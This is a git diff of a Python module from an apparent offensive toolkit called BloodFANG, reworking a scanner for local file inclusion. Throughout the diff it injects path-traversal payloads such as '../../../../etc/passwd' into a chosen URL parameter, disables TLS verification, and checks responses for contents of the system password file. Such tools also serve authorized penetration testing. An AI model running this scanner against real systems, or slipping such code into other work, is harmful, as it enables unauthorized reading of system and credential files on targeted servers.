@@ -1,24 +1,40 @@
-import requests
-import random
+# BloodFANG/core/fanglfi.py
+import requests, urllib.parse, time
+from pathlib import Path
 
-def load_payloads(path="core/payloads/lfi_payloads.txt"):
-    with open(path, 'r') as f:
-        return [line.strip() for line in f if line.strip()]
+PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
+def _load_payloads(name, fallback):
+    f = PAYLOAD_DIR / name
+    try:
+        if f.exists():
+            lines = [l.strip() for l in f.read_text(encoding="utf-8").splitlines()
+                     if l.strip() and not l.startswith("#")]
+            if lines: return lines
+    except Exception: pass
+    return fallback
 
-def get_random_user_agent():
-    with open("data/user_agents.txt", "r") as f:
-        return random.choice(f.read().splitlines())
+PAYLOADS = _load_payloads("lfi_payloads.txt", ["../../../../etc/passwd","/etc/passwd"])
 
-def scan_lfi(target_url, param="file", logger=print):
-    payloads = load_payloads()
-    headers = {"User-Agent": get_random_user_agent()}
-    logger(f"[>] Scanning {target_url} for LFI on parameter '{param}'")
+def _compose(url,param,payload):
+    p = urllib.parse.urlparse(url)
+    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
+    q.append((param,payload))
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q,doseq=True)))
 
-    for payload in payloads:
-        test_url = f"{target_url}?{param}={payload}"
+def scan_lfi(url,param,emit,stop_event=None):
+    if not param: emit("[LFI] Missing parameter."); return
+    emit(f"[LFI] Target: {url} param={param}")
+    for pl in PAYLOADS:
+        if stop_event and stop_event.is_set(): emit("[LFI] Stopped."); return
+        t=_compose(url,param,pl)
         try:
-            r = requests.get(test_url, headers=headers, timeout=8)
-            if "root:x" in r.text or "etc/passwd" in r.text:
-                logger(f"[!!] Possible LFI found with payload: {payload}")
-        except Exception as e:
-            logger(f"[X] Error with payload {payload}: {e}")
+            r=requests.get(t,timeout=8,verify=False)
+            emit(f"[LFI] {r.status_code} → {t}")
+            if "root:x:" in r.text or "passwd" in r.text:
+                emit(f"[LFI] Possible inclusion: {pl}")
+        except Exception as e: emit(f"[LFI] Error: {e}")
+        time.sleep(0.3)
+    emit("[LFI] Complete.")
+
+def scan(target,emit,stop_event=None):
+    u,p=(target.split('::',1)+[''])[:2]; scan_lfi(u,p,emit,stop_event)
